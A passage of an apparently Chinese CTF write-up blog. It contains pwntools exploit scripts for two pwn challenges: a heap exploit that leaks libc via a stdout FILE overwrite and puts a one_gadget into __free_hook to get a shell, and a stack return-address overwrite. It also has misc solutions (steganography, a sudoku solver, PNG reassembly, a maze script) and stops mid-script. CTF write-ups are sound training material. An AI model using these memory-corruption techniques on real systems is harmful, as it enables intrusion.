<span class="number">1</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"101.71.29.5"</span>,<span class="number">10035</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./x64_libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">elf = ELF(<span class="string">"./Box"</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x	: p.recvuntil(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x	: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x	: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x	: p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">	ru(<span class="string">'Your Choice: '</span>)</span><br><span class="line">	sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	ru(<span class="string">'ID: '</span>)</span><br><span class="line">	sl(str(idx))</span><br><span class="line">	ru(<span class="string">'Size: '</span>)</span><br><span class="line">	sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	ru(<span class="string">'ID: '</span>)</span><br><span class="line">	sl(str(idx))</span><br><span class="line">	ru(<span class="string">'Content: '</span>)</span><br><span class="line">	sd(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	ru(<span class="string">'ID: '</span>)</span><br><span class="line">	sl(str(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Done!'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x40'</span></span><br><span class="line">edit(<span class="number">-12</span>, payload) </span><br><span class="line"></span><br><span class="line">libc_base = u64(rv(<span class="number">8</span>)) - <span class="number">0x3c5640</span></span><br><span class="line">log.success(<span class="string">'libc base '</span>+hex(libc_base))</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">free_hook = libc_base + <span class="number">0x3C67A8</span></span><br><span class="line">stderr = libc_base + <span class="number">0x3C5540</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">payload = p64(free_hook)</span><br><span class="line">ru(<span class="string">'Done!'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">-27</span>, payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Done!'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">-27</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Done!'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Soso-easy-pwn"><a href="#Soso-easy-pwn" class="headerlink" title="Soso_easy_pwn"></a>Soso_easy_pwn</h2><p>通过观察栈帧的分布，可以再第一次的输入的时候布置好返回地址，然后再第二次输入的时候输入3来避免对返回地址的修改。</p>
<p>然后功能上有一点bug，就算输出1或者2也没有执行对应的函数。。。这样第二次随便输入就行。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">"g"</span>:</span><br><span class="line">	p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) != <span class="number">1</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"101.71.29.5"</span>,<span class="number">10009</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">tar_off = <span class="number">0x9CD</span></span><br><span class="line">p.recvuntil(<span class="string">'Welcome our the '</span>)</span><br><span class="line">off = int(p.recvuntil(<span class="string">' '</span>).strip())</span><br><span class="line">tar_addr = (off &lt;&lt; <span class="number">16</span>) + tar_off + (<span class="number">1</span> &lt;&lt; <span class="number">12</span>);</span><br><span class="line">log.info(<span class="string">'tar addr '</span>+hex(tar_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> + <span class="string">'b'</span>*<span class="number">4</span> + <span class="string">'c'</span>*<span class="number">4</span> + p32(tar_addr)</span><br><span class="line">p.recvuntil(<span class="string">'So, Can you tell me your name?'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Please input your choice:(1.hello|2.byebye):'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h2><p>题如其名，快乐玩耍就行。</p>
<p><img src="https://i.loli.net/2020/01/17/OWaUrVQu5y1ofXY.png" alt="misc_klyxt.png" style="zoom:50%;"></p>
<h2 id="Hidden-secret"><a href="#Hidden-secret" class="headerlink" title="Hidden secret"></a>Hidden secret</h2><p>下载压缩包是三个文件，使用HxD打开查看额，发现0304、0102、0506字节开头，各加上’PK’后连接起来，得到一个压缩包。打开后是一张图片。其中藏着一个压缩包，打开后发现一个txt文件，用base92解码就能得到。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;K&lt;jslc7b5&apos;gBA&amp;]_5MF!h5+E.@IQ&amp;A%EExEzp\\X#9YhiSHV#&quot;</span><br></pre></td></tr></table></figure>
<h2 id="EasyBox"><a href="#EasyBox" class="headerlink" title="EasyBox"></a>EasyBox</h2><p>这个数独稍微有那么一点点坑2333竟然只要行列满足关系就行，只好自己手写深搜解数独。解完就有flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10011</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_visible</span><span class="params">(idx, maze)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    ix = idx//<span class="number">9</span></span><br><span class="line">    iy = idx%<span class="number">9</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> maze[ix][i] == num <span class="keyword">or</span> maze[i][iy] == num:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            res.append(num)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_empty</span><span class="params">(maze)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> maze[i][j] == <span class="number">0</span>:</span><br><span class="line">                res.append(i*<span class="number">9</span>+j)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_response</span><span class="params">(maze, able)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        print(maze[i])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        p.recvuntil(<span class="string">'answer :\n'</span>)</span><br><span class="line">        ans = <span class="string">''</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> able[i][j] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">                    ans += <span class="string">','</span></span><br><span class="line">                ans += str(maze[i][j])</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ans == <span class="string">''</span>:</span><br><span class="line">            ans += <span class="string">'0'</span></span><br><span class="line">        p.sendline(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_start</span><span class="params">(undo, maze, able)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(undo) == <span class="number">0</span>:</span><br><span class="line">        get_response(maze, able)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    case = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">81</span>)]</span><br><span class="line">    <span class="keyword">while</span> len(undo) != <span class="number">0</span>:</span><br><span class="line">        point = undo.pop()</span><br><span class="line">        <span class="keyword">if</span> case[point] == <span class="number">1</span>:</span><br><span class="line">            undo.append(point)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        case[point] = <span class="number">1</span></span><br><span class="line">        visi = get_visible(point, maze)</span><br><span class="line">        <span class="keyword">if</span> len(visi) == <span class="number">0</span>:</span><br><span class="line">            undo.append(point)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        ix = point // <span class="number">9</span></span><br><span class="line">        iy = point % <span class="number">9</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> visi:</span><br><span class="line">            maze[ix][iy] = num</span><br><span class="line">            <span class="keyword">if</span> get_start(undo, maze, able):</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        maze[ix][iy] = <span class="number">0</span></span><br><span class="line">        undo.insert(<span class="number">0</span>, point)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Fill in missing numbers regularly, separated by commas.\n'</span>)</span><br><span class="line">maze = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>)]</span><br><span class="line">able = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'+-+-+-+-+-+-+-+-+-+\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        p.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">        idx = p.recv(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> idx == <span class="string">' '</span>:</span><br><span class="line">            maze[i][j] = <span class="number">0</span></span><br><span class="line">            able[i][j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[i][j] = int(idx)</span><br><span class="line">            able[i][j] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">undo = get_empty(maze)</span><br><span class="line">get_start(undo, maze, able)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="信号不好我先挂了"><a href="#信号不好我先挂了" class="headerlink" title="信号不好我先挂了"></a>信号不好我先挂了</h2><p>首先是一张图片，丢进Stegsolve，发现是LSB，提取出来后跟原图看起来差不多，Stegsolve查看发现是盲水印，去github里找了个工具，解出来就是flag。</p>
<p>查看红色、绿色、蓝色的0通道，可以发现是LSB。</p>
<p><img src="https://i.loli.net/2020/01/17/KV7a4eqCrR39dpI.png" alt="misc_xhbhwxgl.png" style="zoom:50%;"></p>
<p>盲水印</p>
<p><img src="https://i.loli.net/2020/01/17/MfmFz3OGKqY4owk.png" alt="misc_xhbhwxgl2.png" style="zoom:50%;"></p>
<p>flag</p>
<p><img src="https://i.loli.net/2020/01/17/NqCA4SXcvdFPxO3.png" alt="misc_xhbhwxgl3.png" style="zoom:50%;"></p>
<h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><p>题目给了提示png和拼图，那应该就是按照png的格式把数据块连接起来。在网上找了下png的结构，题目还给了图片大小400x400和RGB颜色。直接QQ截图得到一张400x400的图，这样头部就不用怎么改了，但是要改颜色，把06改成02，因为原本不是RGB。</p>
<p>然后就是写脚本连接了，如果顺序是对的就会多一块。一块一块连上就行了。</p>
<p><img src="https://i.loli.net/2020/01/17/vejRfaZWtP2rgO6.png" alt="misc_puzzle.png" style="zoom:50%;"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">head = <span class="string">b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52\x00\x00\x01\x90\x00\x00\x01\x90\x08\x02\x00\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">tail = <span class="string">b'\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82'</span></span><br><span class="line"></span><br><span class="line">idx = [<span class="number">26</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">10</span>, <span class="number">14</span>]</span><br><span class="line"></span><br><span class="line">middle = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> idx:</span><br><span class="line">    file_name = <span class="string">'chunk ('</span> + str(i) + <span class="string">').data'</span></span><br><span class="line">    <span class="keyword">with</span> open(file_name, <span class="string">'rb'</span>) <span class="keyword">as</span> mid:</span><br><span class="line">        content = bytes(mid.read())</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">14</span>:</span><br><span class="line">        middle += <span class="string">b'\x00\x00\x13\x47'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        middle += <span class="string">b'\x00\x00\x28\x00'</span></span><br><span class="line">    middle += <span class="string">b'IDAT'</span></span><br><span class="line">    middle += content</span><br><span class="line">    middle += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line"></span><br><span class="line">out = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>) <span class="keyword">in</span> idx:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    file_name = <span class="string">'chunk ('</span> + str(i+<span class="number">1</span>) + <span class="string">').data'</span></span><br><span class="line">    <span class="keyword">with</span> open(file_name, <span class="string">'rb'</span>) <span class="keyword">as</span> mid_file:</span><br><span class="line">        content = bytes(mid_file.read())</span><br><span class="line">    content_size = len(content)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">13</span>:</span><br><span class="line">        chunk = <span class="string">b'\x00\x00\x13\x47'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        chunk = <span class="string">b'\x00\x00\x28\x00'</span></span><br><span class="line">    chunk += <span class="string">b'IDAT'</span></span><br><span class="line">    chunk += content</span><br><span class="line">    chunk += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">    out_name = <span class="string">'out_'</span> + str(i+<span class="number">1</span>) + <span class="string">'.png'</span> style=<span class="string">'zoom:50%'</span></span><br><span class="line">    <span class="keyword">with</span> open(out_name, <span class="string">'wb'</span>) <span class="keyword">as</span> out_file:</span><br><span class="line">        out_file.write(head+middle+chunk+tail)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> out == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'final.png'</span> style=<span class="string">'zoom:50%'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(head+middle+tail)</span><br></pre></td></tr></table></figure>
<h2 id="Think"><a href="#Think" class="headerlink" title="Think"></a>Think</h2><p>代码中有个<code>check(checknum)</code>，应该是检测，把checknum换成1，再次运行就行。</p>
<p><img src="https://i.loli.net/2020/01/17/KwyL9qton8jJ6Sd.png" alt="misc_think.png" style="zoom:50%;"></p>
<h2 id="亲爱的"><a href="#亲爱的" class="headerlink" title="亲爱的"></a>亲爱的</h2><p>题目给了给MP3文件，先用binwalk查看，发现有zip文件，提取出来后，解压需要密码。</p>
<p><img src="https://i.loli.net/2020/01/17/YvsCWNU42FVHfKm.png" alt="misc_qad2.png" style="zoom:50%;"></p>
<p>使用HxD打开，发现最后有一条信息，去qq音乐(<del>打钱</del>)找到对应时间的评论是“真的上头”，作为解压密码。得到一张图片。</p>
<p><img src="https://i.loli.net/2020/01/17/jRzLbyZ231UJAvh.png" alt="misc_qad.png" style="zoom:50%;"></p>
<p>再次使用binwalk，发现还有隐藏的东西，提取出来之后在<code>/word/media</code>文件夹下找到flag</p>
<h2 id="无限迷宫"><a href="#无限迷宫" class="headerlink" title="无限迷宫"></a>无限迷宫</h2><p>这个题真的魔鬼吧。。。</p>
<p>首先去网上找了个走迷宫的python脚本，然后通过把黑线加粗至跟白色区域的宽度，这样就能简单的转换成01矩阵。由于题目给的迷宫还挺方正的，通过对角线就能计算出白色区域的宽度。通过小范围内的颜色来确定起点和终点。然后就是使用linux下的unzip命令来完成解压，再加上网上找的改文件名和删除文件的python代码，最后写个while 循环来调用这个脚本来完成自动化跑迷宫233333</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix</span><span class="params">(tout)</span>:</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    mid = <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tout:</span><br><span class="line">        <span class="keyword">if</span> mid != i:</span><br><span class="line">            res += i</span><br><span class="line">            mid = i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mid = <span class="string">'0'</span></span><br><span class="line"></span><br><span class="line">    print(res)</span><br><span class="line">    final()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">translate</span><span class="params">(sol)</span>:</span></span><br><span class="line">    tmp = sol[<span class="number">0</span>]</span><br><span class="line">    tot = len(sol)</span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, tot):</span><br><span class="line">        <span class="keyword">if</span> (tmp[<span class="number">0</span>] == sol[i][<span class="number">0</span>]) <span class="keyword">and</span> (tmp[<span class="number">1</span>] &gt; sol[i][<span class="number">1</span>]):</span><br><span class="line">            res += <span class="string">'3'</span></span><br><span class="line">        <span class="keyword">elif</span> (tmp[<span class="number">0</span>] == sol[i][<span class="number">0</span>]) <span class="keyword">and</span> (tmp[<span class="number">1</span>] &lt; sol[i][<span 